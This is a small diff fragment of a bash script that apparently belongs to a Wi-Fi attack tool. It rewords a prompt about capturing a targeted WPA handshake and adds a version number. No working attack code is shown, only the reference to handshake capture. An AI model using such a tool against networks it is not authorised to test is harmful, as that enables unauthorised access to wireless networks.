-	echo -e "\033[1;32m\nPress Enter to Exit Script Once Tgt'd Handshake has Been Captured\n"
+	echo -e "\033[1;32m\nPress Enter When the Tgt'd Handshake Has Been Captured\n\nThis Will Return You to the Main Menu"
 	read
 	kill -9 $wpa_pid &
 	main_menu--
@@ -2508,6 +2596,7 @@ if [ -z $1  ]; then
 	kill_mon= ## Nulled
 	mon_live= ## Nulled
 	dev_check= ## Nulled
+	version="0.5"
 	greet--
 else
 	usage--
